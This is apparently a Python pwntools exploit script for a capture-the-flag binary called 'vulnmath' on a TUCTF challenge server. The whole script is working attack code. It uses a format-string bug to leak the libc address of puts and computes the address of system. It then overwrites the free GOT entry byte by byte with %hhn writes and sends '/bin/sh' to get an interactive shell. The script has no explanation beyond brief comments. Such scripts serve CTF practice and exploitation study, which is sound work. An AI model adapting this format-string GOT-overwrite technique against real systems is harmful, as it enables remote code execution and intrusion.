#!/usr/bin/python3

from pwn import *

context.log_level = 'debug'

def get_nth_byte_from_num(n, num):
    mask = 0xFF << (8 * n)
    char = (num & mask) >> (8 * n)
    return char

def get_fmt_str_write_char(addr, char):
    val = char - 4

    fmt_str = p32(addr)
    fmt_str += b"%" + str(val).encode("utf-8") + b"u"
    fmt_str += b"%06$hhn"
    return fmt_str

def main():
    #target = process("./vulnmath")
    target = remote("chal.tuctf.com", 30502)

    prompt = target.recvuntil(b"> ")
    print(prompt)

    libc_leak_fmt = p32(0x804c020) # puts@got.plt
    libc_leak_fmt += b"%06$s"
    target.sendline(libc_leak_fmt)
    target.recvuntil(b"Incorrect!\n")

    mem_leak = u32(target.recvuntil(b"> ")[4:8])
    print("puts libc addr =", hex(mem_leak))

    # local offsets
    #libc_base = mem_leak - 0x6c160 # offset of puts in libc (local)
    #system = libc_base + 0x423f0 # offset of system in libc (local)

    # remote offsets
    libc_base = mem_leak - 0x71b70 # offset of ptus in libc (remote)
    system = libc_base + 0x458b0 # offset of system in libc (remote)

    print("libc base addr =", hex(libc_base))
    print("system addr =", hex(system))

    # we are overwriting 0x804c014 <free@got.plt>
    free_got_plt = 0x804c014

    # Example system addr = 0xf7e213f0
    byte_one   = get_nth_byte_from_num(0, system) # 0x3b
    target.sendline(get_fmt_str_write_char(free_got_plt, byte_one))
    target.recvuntil(b"> ")

    byte_two   = get_nth_byte_from_num(1, system) # 0x80
    target.sendline(get_fmt_str_write_char(free_got_plt+1, byte_two))
    target.recvuntil(b"> ")

    byte_three = get_nth_byte_from_num(2, system) # 0xf1
    target.sendline(get_fmt_str_write_char(free_got_plt+2, byte_three))
    target.recvuntil(b"> ")

    byte_four  = get_nth_byte_from_num(3, system) # 0xf7
    target.sendline(get_fmt_str_write_char(free_got_plt+3, byte_four))
    target.recvuntil(b"> ")

    target.sendline(b"/bin/sh;ls")
    target.interactive()

main()
